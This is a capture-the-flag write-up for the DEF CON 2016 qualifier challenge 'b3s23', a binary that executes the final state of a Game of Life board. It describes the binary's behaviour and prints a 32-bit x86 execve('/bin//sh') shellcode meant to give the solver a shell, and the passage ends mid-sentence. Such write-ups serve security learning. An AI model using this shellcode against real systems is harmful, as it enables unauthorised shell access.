# DEFCON Qualifier 2016: b3s23

----------
## Challenge details
| Contest        | Challenge     | Category  | Points | Solves |
|:---------------|:--------------|:----------|-------:|-------:|
| DEF CON CTF Quals 2016 | b3s23 | Coding Challenges |    111 | 34 |

**Description:**

> Please enjoy a Game of Life at b3s23_28f1ea914f8c873d232da030d4dd00e8.quals.shallweplayaga.me:2323
>
> [Download](http://download.quals.shallweplayaga.me/28f1ea914f8c873d232da030d4dd00e8/b3s23)

-------

## Write-up

### Background

From [Wikipedia](https://en.wikipedia.org/wiki/Conway%27s_Game_of_Life) we learn that b3s23 is the standard way of symbolizing Conway's Game of Life, where a cell is born if it has exactly 3 neighbors, survives if it has 2 or 3 living neighbors, or dies if neither is true. 

### Binary Details

```bash
$ file b3s23
ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
```

### Execution
Upon running the binary we receive the following:
```bash
$ docker run -i legitbs/b3s23
Welcome to b3s23.  Enter x,y coordinates.  Enter any other character to run.
```
It is assumed that we need to enter coordinates in the form x,y (e.g. 1,2) followed by any other character in order to set the positions of the initial live cells on the gameboard and iterate the Game of Life. For example, in order to create a a Block, a [still life](https://en.wikipedia.org/wiki/Still_life_(cellular_automaton)), one could enter the following,
```
0,0
0,1
1,0
1,1
a
```
An excerpt of the output would be
```
110000
110000
000000
```
It was observed from the output that the game was iterating 15 times and then the connnection was closed. The output contained a 110x110 gameboard. I verified that if a coordinate less than 0 or greater than 109 was entered the following error would be printed.
```bash
110,0
Illegal Coordinate!
```
While running it locally, a `Segmentation fault (core dumped)` was reported. The initial assumption was that the result of the final iteration from the Game of Life was being executed by the binary somehow.

### Reverse Engineering

(TBD)

### Solution
To solve this challenge I decided to construct an initial Game of Life board such that the final board would contain assembly code that when executed would provide an interactive shell to the client. I started with the following shellcode,

```assembly
mov    $0xb,%al       "\xb0\x0b"                    
cltd                  "\x99"                        
push   %edx           "\x52"                        
push   $0x68732f2f    "\x68\x2f\x2f\x73\x68"        
push   $0x6e69622f    "\x68\x2f\x62\x69\x6e"        
mov    %esp,%ebx      "\x89\xe3"                    
push   %edx           "\x52"                        
push   %ebx           "\x53"                        
mov    %esp,%ecx      "\x89\xe1"                    
int    $0x80          "\xcd\x80"                    
```

Due to the
